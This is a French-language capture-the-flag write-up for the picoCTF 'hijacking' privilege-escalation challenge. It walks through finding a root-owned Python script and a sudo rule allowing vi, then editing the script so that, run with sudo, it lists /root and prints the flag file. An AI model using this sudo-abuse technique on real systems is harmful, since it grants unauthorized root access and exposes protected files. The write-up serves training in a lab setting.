# hijacking

## Enoncé
Catégorie : [Binary Exploitation](../)

Points : 200

Tags : `privilege_escalation`

Description :
> Getting root access can allow you to read the flag.  
> Luckily there is a python file that you might like to play with.
Through Social engineering, we've got the credentials to use on the server. SSH is running on the server.  
> `saturn.picoctf.net xxxxx`  
> `Username: picoctf`  
> `Password: xxxxxx`

Hints :
1. Check for Hidden files
2. No place like Home:)


## Approche

Après s'être connecté au serveur, on examine les fichiers présents dans le HOME directory du user `picoctf` :
```bash
picoctf@challenge:~$ ls -al
total 16
drwxr-xr-x 1 picoctf picoctf   20 Mar 18 17:25 .
drwxr-xr-x 1 root    root      21 Mar 16 02:08 ..
-rw-r--r-- 1 picoctf picoctf  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoctf picoctf 3771 Feb 25  2020 .bashrc
drwx------ 2 picoctf picoctf   34 Mar 18 17:25 .cache
-rw-r--r-- 1 picoctf picoctf  807 Feb 25  2020 .profile
-rw-r--r-- 1 root    root     375 Mar 16 01:30 .server.py
```

Le contenu du fichier `.server.py` est le suivant :
```py
import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip)
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info)
```

Quand on essaie de l'exécuter (`python3 .server.py`) une erreur indique que `ping` n'existe pas.

Chose intéressante, `.server.py` appartient au user `root`. 


## Solution

Si on examine les droits `sudo` pour le user `picoctf`, on s'aperçoit qu'en plus de pouvoir exécuter le script `.server.py`, on peut également utiliser l'éditeur `vi` :

```bash
picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

On a donc la possibilité :
* d'exécuer le script `.server.py` en tant que `root`
* d'en modifier le contenu

On modifie donc le script en 2 temps, afin de pouvoir lister les fichiers présents dans le HOME directory du user `root`, puis d'afficher le contenu du fichier contenant le flag :

```py
import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ls /root/.* " )
response = os.system("cat /root/.flag.txt " )
```

Puis on le lance via `sudo` :
```bash
picoctf@challenge:~$ sudo /usr/bin/python3 /home/picoctf/.server.py
/root/.bashrc  /root/.flag.txt  /root/.profile

/root/.:

/root/..:
bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
picoCTF{pYth0nn_libraryH!j@CK!n9_xxxxxxxx}
```
